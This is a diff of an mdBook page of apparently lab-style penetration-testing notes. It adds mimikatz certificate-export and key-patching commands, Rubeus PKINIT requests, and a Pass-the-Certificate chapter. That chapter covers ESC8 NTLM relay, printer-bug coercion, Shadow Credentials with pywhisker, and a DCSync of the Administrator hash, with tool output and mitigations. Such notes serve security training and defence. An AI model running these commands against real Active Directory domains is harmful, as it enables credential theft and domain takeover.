@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-45f66119.js";
+            window.path_to_searchindex_js = "searchindex-4f962408.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-9a594cb9.js"></script>
+        <script src="toc-22248eaf.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -609,6 +609,8 @@
 <li><a href="#linux-authentication">linux-auth</a></li>
 <li><a href="#pass-the-hash-pth-attacks">Pass The Hash</a></li>
 <li><a href="#pass-the-ticket-ptt-attacks">Pass the Ticket</a></li>
+<li><a href="#pass-the-certificate-ptc-attacks">Pass the Certificate</a></li>
+<li><a href="#windows-logon-types">Logon Types</a></li>
 </ul>
 </li>
 </ul>
@@ -3707,6 +3709,31 @@ $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
 <pre><code>sekurlsa::ekeys
 </code></pre>
 <hr>
+<h2 id="crypto-module-certificates"><a class="header" href="#crypto-module-certificates">crypto Module (Certificates)</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>crypto::capi</code></td><td>Patch CryptoAPI to make non-exportable keys exportable</td></tr>
+<tr><td><code>crypto::cng</code></td><td>Patch CNG to make non-exportable keys exportable</td></tr>
+<tr><td><code>crypto::certificates /export</code></td><td>Export all user certificates</td></tr>
+<tr><td><code>crypto::certificates /systemstore:local_machine /export</code></td><td>Export machine certificates</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="export-user-certificates"><a class="header" href="#export-user-certificates">Export User Certificates</a></h3>
+<pre><code>crypto::certificates /export
+</code></pre>
+<h3 id="export-machine-certificates"><a class="header" href="#export-machine-certificates">Export Machine Certificates</a></h3>
+<pre><code>crypto::certificates /systemstore:local_machine /export
+</code></pre>
+<h3 id="make-keys-exportable-patch-cryptoapi"><a class="header" href="#make-keys-exportable-patch-cryptoapi">Make Keys Exportable (Patch CryptoAPI)</a></h3>
+<pre><code>crypto::capi
+crypto::cng
+</code></pre>
+<hr>
 <h2 id="lsadump-module"><a class="header" href="#lsadump-module">lsadump Module</a></h2>
 <div class="table-wrapper">
 <table>
@@ -3789,6 +3816,12 @@ lsadump::dcsync /domain:domain.local /all /csv
 </code></pre>
 <h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
 <pre><code class="language-cmd">mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:&lt;hash&gt; /ptt" "exit"
+</code></pre>
+<h3 id="export-all-certificates"><a class="header" href="#export-all-certificates">Export All Certificates</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /export" "exit"
+</code></pre>
+<h3 id="export-machine-certificates-1"><a class="header" href="#export-machine-certificates-1">Export Machine Certificates</a></h3>
+<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /systemstore:local_machine /export" "exit"
 </code></pre>
 <hr>
 <h2 id="common-errors"><a class="header" href="#common-errors">Common Errors</a></h2>
@@ -3916,6 +3949,15 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 </table>
 </div>
 <hr>
+<h2 id="pkinit-certificate-authentication"><a class="header" href="#pkinit-certificate-authentication">PKINIT (Certificate Authentication)</a></h2>
+<h3 id="request-tgt-with-pfx-certificate"><a class="header" href="#request-tgt-with-pfx-certificate">Request TGT with PFX Certificate</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:&lt;path_or_base64&gt; /password:&lt;pfx_password&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-pfx-and-import"><a class="header" href="#request-tgt-with-pfx-and-import">Request TGT with PFX and Import</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:C:\cert.pfx /password:CertPass123 /ptt
+</code></pre>
+<p><strong>Note:</strong> Used in Pass-the-Certificate attacks after obtaining a certificate from AD CS exploitation or Shadow Credentials attacks.</p>
+<hr>
 <h2 id="ticket-harvesting"><a class="header" href="#ticket-harvesting">Ticket Harvesting</a></h2>
 <h3 id="dump-all-tickets-base64"><a class="header" href="#dump-all-tickets-base64">Dump All Tickets (Base64)</a></h3>
 <pre><code class="language-cmd">Rubeus.exe dump /nowrap
@@ -3945,6 +3987,12 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 </code></pre>
 <h3 id="request-tgt-using-domain-controller"><a class="header" href="#request-tgt-using-domain-controller">Request TGT Using Domain Controller</a></h3>
 <pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /rc4:&lt;hash&gt; /dc:&lt;dc_ip&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-certificate-pkinit"><a class="header" href="#request-tgt-with-certificate-pkinit">Request TGT with Certificate (PKINIT)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:&lt;base64_or_path&gt; /password:&lt;pfx_password&gt; /nowrap
+</code></pre>
+<h3 id="request-tgt-with-certificate-file"><a class="header" href="#request-tgt-with-certificate-file">Request TGT with Certificate File</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /certificate:C:\path\to\cert.pfx /password:&lt;pfx_password&gt; /ptt
 </code></pre>
 <hr>
 <h2 id="pass-the-ticket-ptt"><a class="header" href="#pass-the-ticket-ptt">Pass the Ticket (ptt)</a></h2>
@@ -28439,6 +28487,7 @@ sudo cp /etc/shadow /tmp/shadow.bak
 <li><strong>AS-REP Roasting</strong>: Extract hashes from accounts without pre-authentication</li>
 <li><strong>Constrained Delegation Abuse</strong>: S4U2Self and S4U2Proxy attacks</li>
 <li><strong>Ticket Forging</strong>: Create Golden and Silver tickets (with appropriate hashes)</li>
+<li><strong>PKINIT</strong>: Request TGTs using X.509 certificates (Pass-the-Certificate)</li>
 </ul>
 <hr>
 <h2 id="installation-9"><a class="header" href="#installation-9">Installation</a></h2>
@@ -28468,6 +28517,28 @@ sudo cp /etc/shadow /tmp/shadow.bak
 <h3 id="request-tgt-and-import-into-session"><a class="header" href="#request-tgt-and-import-into-session">Request TGT and Import into Session</a></h3>
 <pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
 </code></pre>
+<hr>
+<h2 id="pkinit-certificate-authentication-1"><a class="header" href="#pkinit-certificate-authentication-1">PKINIT (Certificate Authentication)</a></h2>
+<p>Request TGT using an X.509 certificate instead of a hash. Used in Pass-the-Certificate attacks after obtaining certificates from AD CS exploitation or Shadow Credentials attacks.</p>
+<h3 id="request-tgt-with-pfx-certificate-1"><a class="header" href="#request-tgt-with-pfx-certificate-1">Request TGT with PFX Certificate</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /certificate:C:\path\to\cert.pfx /password:PfxPassword123 /nowrap
+</code></pre>
+<h3 id="request-tgt-with-base64-certificate"><a class="header" href="#request-tgt-with-base64-certificate">Request TGT with Base64 Certificate</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /certificate:&lt;base64_pfx&gt; /password:&lt;pfx_password&gt; /ptt
+</code></pre>
+<h3 id="pkinit-options"><a class="header" href="#pkinit-options">PKINIT Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>/certificate:&lt;path_or_base64&gt;</code></td><td>Path to PFX file or Base64-encoded certificate</td></tr>
+<tr><td><code>/password:&lt;password&gt;</code></td><td>Password for the PFX file</td></tr>
+</tbody>
+</table>
+</div>
+<p><strong>Note:</strong> If PKINIT is not supported by the KDC, use tools like <code>gettgtpkinit.py</code> from PKINITtools or <code>PassTheCert</code> for LDAPS authentication.</p>
 <hr>
 <h2 id="pass-the-ticket-ptt-1"><a class="header" href="#pass-the-ticket-ptt-1">Pass the Ticket (PtT)</a></h2>
 <h3 id="import-kirbi-file-1"><a class="header" href="#import-kirbi-file-1">Import .kirbi File</a></h3>
@@ -28697,7 +28768,7 @@ des_cbc_md5          : ...
 <tr><td><code>kerberos</code></td><td>Kerberos ticket operations</td></tr>
 <tr><td><code>vault</code></td><td>Windows Vault/Credential Manager</td></tr>
 <tr><td><code>dpapi</code></td><td>DPAPI masterkey and blob decryption</td></tr>
-<tr><td><code>crypto</code></td><td>Certificate and key operations</td></tr>
+<tr><td><code>crypto</code></td><td>Certificate and key operations (Pass-the-Certificate)</td></tr>
 <tr><td><code>token</code></td><td>Token manipulation</td></tr>
 </tbody>
 </table>
@@ -28727,6 +28798,36 @@ des_cbc_md5          : ...
 <pre><code>sekurlsa::pth /user:Administrator /domain:DOMAIN /aes256:&lt;aes256_hash&gt; /run:cmd
 </code></pre>
 <p>Converts a Kerberos key (AES256, AES128, or RC4) into a full TGT. The spawned process can then request service tickets for lateral movement.</p>
+<hr>
+<h2 id="crypto-module-certificates-1"><a class="header" href="#crypto-module-certificates-1">crypto Module (Certificates)</a></h2>
+<p>Used for certificate operations related to Pass-the-Certificate attacks and AD CS abuse.</p>
+<h3 id="export-user-certificates-1"><a class="header" href="#export-user-certificates-1">Export User Certificates</a></h3>
+<pre><code>crypto::certificates /export
+</code></pre>
+<h3 id="export-machine-certificates-2"><a class="header" href="#export-machine-certificates-2">Export Machine Certificates</a></h3>
+<pre><code>crypto::certificates /systemstore:local_machine /export
+</code></pre>
+<h3 id="make-non-exportable-keys-exportable"><a class="header" href="#make-non-exportable-keys-exportable">Make Non-Exportable Keys Exportable</a></h3>
+<pre><code>crypto::capi
+crypto::cng
+</code></pre>
+<p>Patches CryptoAPI/CNG to allow export of keys marked as non-exportable. Run before exporting certificates.</p>
+<h3 id="common-crypto-commands"><a class="header" href="#common-crypto-commands">Common crypto Commands</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>crypto::capi</code></td><td>Patch CryptoAPI for key export</td></tr>
+<tr><td><code>crypto::cng</code></td><td>Patch CNG for key export</td></tr>
+<tr><td><code>crypto::certificates /export</code></td><td>Export user certificates to PFX</td></tr>
+<tr><td><code>crypto::certificates /systemstore:local_machine /export</code></td><td>Export machine certificates</td></tr>
+<tr><td><code>crypto::keys</code></td><td>List cryptographic keys</td></tr>
+<tr><td><code>crypto::stores</code></td><td>List certificate stores</td></tr>
+</tbody>
+</table>
+</div>
 <hr>
 <h2 id="lsadump-module-1"><a class="header" href="#lsadump-module-1">lsadump Module</a></h2>
 <h3 id="dump-sam-database-1"><a class="header" href="#dump-sam-database-1">Dump SAM Database</a></h3>
@@ -29343,6 +29444,8 @@ ac
 <li><a href="#attacking-active-directory">ADDS</a></li>
 <li><a href="#attacking-windows-credential-manager">credential manager</a></li>
 <li><a href="#pass-the-hash-pth-attacks">pass-the-hash</a></li>
+<li><a href="#pass-the-ticket-ptt-attacks">pass-the-ticket</a></li>
+<li><a href="#pass-the-certificate-ptc-attacks">pass-the-certificate</a></li>
 </ul>
 <h3 id="linux-1"><a class="header" href="#linux-1">Linux</a></h3>
 <ul>
@@ -31502,7 +31605,7 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
 </div>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="pass-the-hash-pth-attacks"><a class="header" href="#pass-the-hash-pth-attacks">Pass the Hash (PtH) Attacks</a></h1>
-<p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn’t need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p>
+<p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn’t need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash is not salted and remains static for every session until the password is changed.</p>
 <h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
 <p>The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p>
 <ul>
@@ -32235,6 +32338,466 @@ Default principal: julio@INLANEFREIGHT.HTB
 <li><a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a></li>
 <li><a href="https://github.com/CiscoCXSecurity/linikatz">Linikatz</a></li>
 <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="pass-the-certificate-ptc-attacks"><a class="header" href="#pass-the-certificate-ptc-attacks">Pass the Certificate (PtC) Attacks</a></h1>
+<p>A Pass the Certificate (PtC) attack uses X.509 certificates to obtain Ticket Granting Tickets (TGTs) for authentication. This technique leverages PKINIT, an extension of the Kerberos protocol that enables the use of public key cryptography during initial authentication. It is primarily used alongside attacks against Active Directory Certificate Services (AD CS) and Shadow Credential attacks.</p>
+<h2 id="pkinit-overview"><a class="header" href="#pkinit-overview">PKINIT Overview</a></h2>
+<p>PKINIT (Public Key Cryptography for Initial Authentication) is a Kerberos extension that allows users to authenticate using certificates instead of passwords. It is typically used for smart card authentication, where the private key is stored on the smart card.</p>
+<h3 id="how-pkinit-works"><a class="header" href="#how-pkinit-works">How PKINIT Works</a></h3>
+<ol>
+<li>User presents their certificate to the KDC</li>
+<li>KDC validates the certificate against the CA</li>
+<li>If valid, KDC issues a TGT encrypted with the certificate’s public key</li>
+<li>User decrypts the TGT with their private key</li>
+</ol>
+<p>Attackers can abuse this by obtaining valid certificates through AD CS attacks and using them to request TGTs.</p>
+<hr>
+<h2 id="prerequisites-2"><a class="header" href="#prerequisites-2">Prerequisites</a></h2>
+<p>To perform a Pass the Certificate attack, you need:</p>
+<ul>
+<li>A valid X.509 certificate for a target user or computer</li>
+<li>The corresponding private key (typically in PFX/PKCS12 format)</li>
+<li>The certificate must be trusted by the domain’s Certificate Authority</li>
+</ul>
+<p>Certificates can be obtained through:</p>
+<ul>
+<li>AD CS NTLM Relay attacks (ESC8)</li>
+<li>Shadow Credential attacks (msDS-KeyCredentialLink abuse)</li>
+<li>Compromised Certificate Authority</li>
+<li>Stolen certificates from user workstations</li>
+</ul>
+<hr>
+<h2 id="ad-cs-ntlm-relay-attack-esc8"><a class="header" href="#ad-cs-ntlm-relay-attack-esc8">AD CS NTLM Relay Attack (ESC8)</a></h2>
+<p>ESC8 is an NTLM relay attack targeting an AD CS HTTP endpoint. When a CA is configured to allow web enrollment over HTTP, attackers can relay authentication requests to obtain certificates.</p>
+<p><strong>Note:</strong> AD CS attacks are covered in depth in dedicated ADCS Attacks modules.</p>
+<h3 id="step-1-set-up-ntlm-relay"><a class="header" href="#step-1-set-up-ntlm-relay">Step 1: Set Up NTLM Relay</a></h3>
+<p>Use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service:</p>
+<pre><code class="language-bash">$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+</code></pre>
+<p><strong>Note:</strong> The <code>--template</code> value may differ by environment. This specifies the certificate template used by Domain Controllers for authentication. Enumerate templates with tools like <code>certipy</code>.</p>
+<h3 id="step-2-coerce-authentication"><a class="header" href="#step-2-coerce-authentication">Step 2: Coerce Authentication</a></h3>
+<p>Force a machine account to authenticate against your host using the printer bug:</p>
+<pre><code class="language-bash">$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+
+[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
+[*] Bind OK
+[*] Got handle
+RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
+[*] Triggered RPC backconnect, this may or may not have worked
+</code></pre>
+<p><strong>Requirement:</strong> The target machine must have the Printer Spooler service running.</p>
+<h3 id="step-3-obtain-certificate"><a class="header" href="#step-3-obtain-certificate">Step 3: Obtain Certificate</a></h3>
+<p>The relay attack produces output similar to:</p>
+<pre><code>[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
+[*] Converting PEM -&gt; PFX with cryptography: eFUVVTPf.pfx
+[+] PFX exportiert nach: eFUVVTPf.pfx
+[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
+[+] Saved PFX (#PKCS12) certificate &amp; key at path: eFUVVTPf.pfx
+[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+</code></pre>
+<hr>
+<h2 id="obtaining-a-tgt-with-pkinit"><a class="header" href="#obtaining-a-tgt-with-pkinit">Obtaining a TGT with PKINIT</a></h2>
+<h3 id="using-gettgtpkinitpy-pkinittools"><a class="header" href="#using-gettgtpkinitpy-pkinittools">Using gettgtpkinit.py (PKINITtools)</a></h3>
+<h4 id="installation-11"><a class="header" href="#installation-11">Installation</a></h4>
+<pre><code class="language-bash">$ git clone https://github.com/dirkjanm/PKINITtools.git &amp;&amp; cd PKINITtools
+$ python3 -m venv .venv
+$ source .venv/bin/activate
+$ pip3 install -r requirements.txt
+</code></pre>
+<p><strong>Fix for libcrypto errors:</strong></p>
+<pre><code class="language-bash">$ pip3 install -I git+https://github.com/wbond/oscrypto.git
+</code></pre>
+<h4 id="request-tgt-using-certificate"><a class="header" href="#request-tgt-using-certificate">Request TGT Using Certificate</a></h4>
+<p>For a machine account certificate:</p>
+<pre><code class="language-bash">$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+
+2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
+INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
+2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+</code></pre>
+<p>For a user certificate with PFX password:</p>
+<pre><code class="language-bash">$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
+2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
+2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
+2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
+2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
+</code></pre>
+<hr>
+<h2 id="pass-the-ticket-after-certificate-authentication"><a class="header" href="#pass-the-ticket-after-certificate-authentication">Pass the Ticket After Certificate Authentication</a></h2>
+<p>Once you have a TGT, you can use standard Pass the Ticket techniques.</p>
+<h3 id="set-environment-variable"><a class="header" href="#set-environment-variable">Set Environment Variable</a></h3>
+<pre><code class="language-bash">$ export KRB5CCNAME=/tmp/jpinkman.ccache
+</code></pre>
+<h3 id="verify-ticket"><a class="header" href="#verify-ticket">Verify Ticket</a></h3>
+<pre><code class="language-bash">$ klist
+
+Ticket cache: FILE:/tmp/jpinkman.ccache
+Default principal: jpinkman@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+</code></pre>
+<h3 id="connect-via-evil-winrm"><a class="header" href="#connect-via-evil-winrm">Connect via Evil-WinRM</a></h3>
+<pre><code class="language-bash">$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+                                        
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jpinkman\Documents&gt; whoami
+inlanefreight\jpinkman
+</code></pre>
+<p><strong>Note:</strong> Ensure that <code>/etc/krb5.conf</code> is properly configured for Kerberos authentication.</p>
+<h3 id="dcsync-with-machine-account-tgt"><a class="header" href="#dcsync-with-machine-account-tgt">DCSync with Machine Account TGT</a></h3>
+<p>As a domain controller’s machine account, perform a DCSync attack:</p>
+<pre><code class="language-bash">$ export KRB5CCNAME=/tmp/dc.ccache
+$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
+</code></pre>
+<hr>
+<h2 id="shadow-credentials-msds-keycredentiallink"><a class="header" href="#shadow-credentials-msds-keycredentiallink">Shadow Credentials (msDS-KeyCredentialLink)</a></h2>
+<p>Shadow Credentials is an attack that abuses the <code>msDS-KeyCredentialLink</code> attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the <code>AddKeyCredentialLink</code> edge indicates write permissions over another user’s <code>msDS-KeyCredentialLink</code> attribute.</p>
+<h3 id="using-pywhisker"><a class="header" href="#using-pywhisker">Using pywhisker</a></h3>
+<p>Generate a certificate and write the public key to the victim’s <code>msDS-KeyCredentialLink</code> attribute:</p>
+<pre><code class="language-bash">$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+[*] Searching for the target account
+[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
+[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+</code></pre>
+<h3 id="pywhisker-commands"><a class="header" href="#pywhisker-commands">pywhisker Commands</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--action add</code></td><td>Add a new KeyCredential to the target</td></tr>
+<tr><td><code>--action list</code></td><td>List existing KeyCredentials</td></tr>
+<tr><td><code>--action remove --device-id &lt;id&gt;</code></td><td>Remove a specific KeyCredential</td></tr>
+<tr><td><code>--action clear</code></td><td>Remove all KeyCredentials</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="when-pkinit-is-not-supported"><a class="header" href="#when-pkinit-is-not-supported">When PKINIT Is Not Supported</a></h2>
+<p>In certain environments, the KDC may not support the appropriate EKU (Extended Key Usage) for PKINIT authentication. In these cases, use <code>PassTheCert</code> to authenticate against LDAPS and perform various attacks.</p>
+<h3 id="passthecert"><a class="header" href="#passthecert">PassTheCert</a></h3>
+<p>PassTheCert authenticates against LDAPS using a certificate and can perform various attacks without PKINIT support:</p>
+<ul>
+<li>Change user passwords</li>
+<li>Grant DCSync rights</li>
+<li>Modify group memberships</li>
+<li>Add computer accounts</li>
+</ul>
+<p><strong>Repository:</strong> https://github.com/AlmondOffSec/PassTheCert</p>
+<hr>
+<h2 id="summary-of-key-commands-1"><a class="header" href="#summary-of-key-commands-1">Summary of Key Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>ntlmrelayx</td><td><code>impacket-ntlmrelayx -t http://&lt;CA&gt;/certsrv/certfnsh.asp --adcs -smb2support</code></td><td>Relay NTLM to AD CS</td></tr>
+<tr><td>printerbug.py</td><td><code>python3 printerbug.py DOMAIN/user:pass@target attacker_ip</code></td><td>Coerce authentication via printer bug</td></tr>
+<tr><td>gettgtpkinit.py</td><td><code>python3 gettgtpkinit.py -cert-pfx &lt;pfx&gt; -dc-ip &lt;dc&gt; DOMAIN/user ccache</code></td><td>Request TGT with certificate</td></tr>
+<tr><td>pywhisker</td><td><code>pywhisker -d DOMAIN -u user -p pass --target victim --action add</code></td><td>Shadow Credentials attack</td></tr>
+<tr><td>certipy</td><td><code>certipy find -u user@domain -p pass -dc-ip &lt;dc&gt;</code></td><td>Enumerate AD CS templates</td></tr>
+<tr><td>evil-winrm</td><td><code>evil-winrm -i &lt;host&gt; -r &lt;realm&gt;</code></td><td>Connect using Kerberos auth</td></tr>
+<tr><td>secretsdump</td><td><code>impacket-secretsdump -k -no-pass &lt;target&gt;</code></td><td>DCSync with Kerberos</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="related-attack-paths"><a class="header" href="#related-attack-paths">Related Attack Paths</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Attack</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>ESC1-ESC8</strong></td><td>Various AD CS misconfigurations</td></tr>
+<tr><td><strong>Golden Certificate</strong></td><td>Forge certificates using compromised CA private key</td></tr>
+<tr><td><strong>Shadow Credentials</strong></td><td>Abuse msDS-KeyCredentialLink for persistence</td></tr>
+<tr><td><strong>UnPAC the Hash</strong></td><td>Recover NTLM hash from AS-REP using certificate</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="mitigations-3"><a class="header" href="#mitigations-3">Mitigations</a></h2>
+<ul>
+<li>Disable HTTP-based certificate enrollment or require HTTPS</li>
+<li>Enable Extended Protection for Authentication on AD CS web endpoints</li>
+<li>Monitor changes to <code>msDS-KeyCredentialLink</code> attribute</li>
+<li>Implement certificate-based authentication logging</li>
+<li>Use Certificate Enrollment Web Service (CES) instead of legacy web enrollment</li>
+<li>Restrict certificate template permissions</li>
+<li>Disable the Print Spooler service on Domain Controllers</li>
+<li>Enable Credential Guard to protect against ticket theft</li>
+</ul>
+<hr>
+<h2 id="references-6"><a class="header" href="#references-6">References</a></h2>
+<ul>
+<li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified Pre-Owned - SpecterOps</a></li>
+<li><a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></li>
+<li><a href="https://github.com/ShutdownRepo/pywhisker">pywhisker</a></li>
+<li><a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a></li>
+<li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+<li><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials - Elad Shamir</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="windows-logon-types"><a class="header" href="#windows-logon-types">Windows Logon Types</a></h1>
+<p>Logon types appear in Windows Security event logs (Event IDs 4624, 4625) and indicate how a user or process authenticated to the system. Understanding logon types is essential for security monitoring, incident response, and forensic analysis.</p>
+<hr>
+<h2 id="quick-reference-2"><a class="header" href="#quick-reference-2">Quick Reference</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Name</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>2</td><td>Interactive</td><td>Local keyboard/console logon</td></tr>
+<tr><td>3</td><td>Network</td><td>Access from network (SMB, etc.)</td></tr>
+<tr><td>4</td><td>Batch</td><td>Scheduled task execution</td></tr>
+<tr><td>5</td><td>Service</td><td>Service started by SCM</td></tr>
+<tr><td>7</td><td>Unlock</td><td>Workstation unlock</td></tr>
+<tr><td>8</td><td>NetworkCleartext</td><td>Network logon with cleartext password</td></tr>
+<tr><td>9</td><td>NewCredentials</td><td>RunAs /netonly (cloned token)</td></tr>
+<tr><td>10</td><td>RemoteInteractive</td><td>RDP/Terminal Services</td></tr>
+<tr><td>11</td><td>CachedInteractive</td><td>Domain logon with cached credentials</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="detailed-descriptions"><a class="header" href="#detailed-descriptions">Detailed Descriptions</a></h2>
+<h3 id="logon-type-2-interactive"><a class="header" href="#logon-type-2-interactive">Logon Type 2: Interactive</a></h3>
+<p><strong>Description:</strong> A user logged on to this computer locally.</p>
+<p>An event with logon type 2 occurs when a user logs on (or attempts to log on) locally, such as typing username and password at the Windows logon prompt.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Occurs for both local and domain account logons</li>
+<li>For domain accounts, this type appears only when the user actually authenticates against a domain controller</li>
+<li>If the DC is unavailable but valid cached credentials exist, Windows logs type 11 instead</li>
+</ul>
+<p><strong>Common Scenarios:</strong></p>
+<ul>
+<li>User logs on at the physical console</li>
+<li>Fast User Switching between accounts (generates type 2, not type 7)</li>
+</ul>
+<hr>
+<h3 id="logon-type-3-network"><a class="header" href="#logon-type-3-network">Logon Type 3: Network</a></h3>
